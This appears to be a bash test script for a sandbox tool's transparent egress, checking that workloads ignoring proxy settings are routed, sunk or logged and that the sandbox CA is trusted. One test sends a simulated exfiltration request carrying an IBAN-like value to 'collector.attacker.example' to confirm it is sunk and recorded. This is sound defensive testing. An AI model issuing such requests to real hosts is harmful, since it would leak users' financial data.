#!/usr/bin/env bash
# ============================================================================
# t_transparent_egress.sh — a workload that ignores the proxy (ADR-0027)
#
# Tests:
#   1. Without transparent egress, a client with no proxy settings fails
#      to connect, and no event says it tried (the gap)
#   2. With it, the same client reaches a declared host over HTTPS (by SNI)
#   3. ... and over plain HTTP (by Host)
#   4. An undeclared host it reaches directly is sunk, and the request it
#      carried is recorded
#   5. A client that also ignores SSL_CERT_FILE rejects the sandbox CA; the
#      attempt is recorded with its host instead of vanishing
#   6. With overlay_ca_bundles (ADR-0028), a client with no environment
#      trusts the sandbox CA through OpenSSL's default bundle
#   7. ... and through a project virtualenv's certifi bundle, which the host
#      keeps unchanged
# ============================================================================

source "$(dirname "$0")/lib.sh"
require_user_namespaces
require_pasta
require_python3
header "Transparent egress"

WORK=$(mktemp -d)
trap 'kill "$SERVER_PID" 2>/dev/null; rm -rf "$WORK"; cleanup' EXIT

PORT=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1])')
python3 - "$PORT" >/dev/null 2>&1 <<'PY' &
import http.server, sys

class Answer(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"from-the-host\n")

http.server.HTTPServer(("127.0.0.1", int(sys.argv[1])), Answer).serve_forever()
PY
SERVER_PID=$!
sleep 0.5

recipe() {
    tmpconfig <<TOML
[network]
egress = "proxy"
undeclared_hosts = "sink"
$1

[unsafe]
host_loopback = true

[[host]]
domain = "mock.example"
upstream = "loopback:$PORT"
TOML
}
PLAIN=$(recipe "")
TRANSPARENT=$(recipe "transparent = true")
OVERLAID=$(recipe "transparent = true
overlay_ca_bundles = true")
_TMPFILES+=("$PLAIN" "$TRANSPARENT" "$OVERLAID")

# No proxy variables at all, as a stdio MCP server started by the MCP SDK.
NO_PROXY_ENV=(env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy)
FETCH='import ssl, sys, urllib.request
context = ssl._create_unverified_context()
try:
    print(urllib.request.urlopen(sys.argv[1], timeout=10, context=context).read().decode().strip())
except Exception as e:
    print("failed:", type(e).__name__)'

begin_test "without transparent egress, a client ignoring the proxy fails unseen"
run_can run --recipe "$PLAIN" --events-file "$WORK/plain.jsonl" \
    -- "${NO_PROXY_ENV[@]}" python3 -c "$FETCH" https://mock.example/x
assert_contains "$RUN_STDOUT" "failed:"
assert_not_contains "$(cat "$WORK/plain.jsonl" 2>/dev/null)" '"host":"mock.example"'

begin_test "with it, the client reaches a declared host over HTTPS"
run_can run --recipe "$TRANSPARENT" \
    -- "${NO_PROXY_ENV[@]}" python3 -c "$FETCH" https://mock.example/x
assert_eq "from-the-host" "$RUN_STDOUT"

begin_test "and over plain HTTP"
run_can run --recipe "$TRANSPARENT" \
    -- "${NO_PROXY_ENV[@]}" python3 -c "$FETCH" http://mock.example/x
assert_eq "from-the-host" "$RUN_STDOUT"

begin_test "an undeclared host reached directly is sunk, with its request recorded"
run_can run --recipe "$TRANSPARENT" --events-file "$WORK/sunk.jsonl" \
    -- "${NO_PROXY_ENV[@]}" python3 -c "$FETCH" "https://collector.attacker.example/in?iban=CH93"
SUNK=$(python3 - "$WORK/sunk.jsonl" <<'PY'
import json, sys
for line in open(sys.argv[1], encoding="utf-8"):
    e = json.loads(line)
    d = e["data"]
    if e["event"] == "egress_request" and d.get("reason") == "sink" and d.get("method") != "CONNECT":
        print(d["host"] + d["path"])
PY
)
assert_contains "$SUNK" "collector.attacker.example/in"

begin_test "a client that rejects the sandbox CA is recorded, not lost"
run_can run --recipe "$TRANSPARENT" --events-file "$WORK/rejected.jsonl" \
    -- env -i PATH=/usr/bin:/bin python3 -c 'import ssl, urllib.request
try:
    urllib.request.urlopen("https://mock.example/x", timeout=10, context=ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT))
except Exception as e:
    print("failed:", type(e).__name__)'
REJECTED=$(python3 - "$WORK/rejected.jsonl" <<'PY'
import json, sys
for line in open(sys.argv[1], encoding="utf-8"):
    e = json.loads(line)
    if e["event"] == "egress_request" and e["data"].get("reason") == "client_rejected_ca":
        print(e["data"]["host"])
PY
)
assert_contains "$RUN_STDOUT" "failed:"
assert_eq "mock.example" "$REJECTED"

# No environment at all, and only the trust a client finds by itself.
BUNDLE_FETCH='import ssl, sys, urllib.request
context = ssl.create_default_context(cafile=sys.argv[1] if len(sys.argv) > 1 else None)
try:
    print(urllib.request.urlopen("https://mock.example/x", timeout=10, context=context).read().decode().strip())
except Exception as e:
    print("failed:", type(e).__name__)'

begin_test "with overlay_ca_bundles, OpenSSL's default bundle trusts the sandbox CA"
run_can run --recipe "$OVERLAID" -- env -i PATH=/usr/bin:/bin python3 -c "$BUNDLE_FETCH"
assert_eq "from-the-host" "$RUN_STDOUT"

begin_test "and so does a project virtualenv's certifi bundle, unchanged on the host"
PROJECT="$WORK/project"
CERTIFI="$PROJECT/.venv/lib/python3.12/site-packages/certifi/cacert.pem"
mkdir -p "$(dirname "$CERTIFI")"
python3 -c 'import ssl, shutil, sys; paths = ssl.get_default_verify_paths(); shutil.copy(paths.cafile or paths.openssl_cafile, sys.argv[1])' "$CERTIFI"
BEFORE=$(sha256sum < "$CERTIFI")
pushd "$PROJECT" >/dev/null
run_can run --recipe "$TRANSPARENT" -- env -i PATH=/usr/bin:/bin python3 -c "$BUNDLE_FETCH" "$CERTIFI"
assert_contains "$RUN_STDOUT" "failed:"
run_can run --recipe "$OVERLAID" -- env -i PATH=/usr/bin:/bin python3 -c "$BUNDLE_FETCH" "$CERTIFI"
popd >/dev/null
assert_eq "from-the-host" "$RUN_STDOUT"
assert_eq "$BEFORE" "$(sha256sum < "$CERTIFI")"

summary
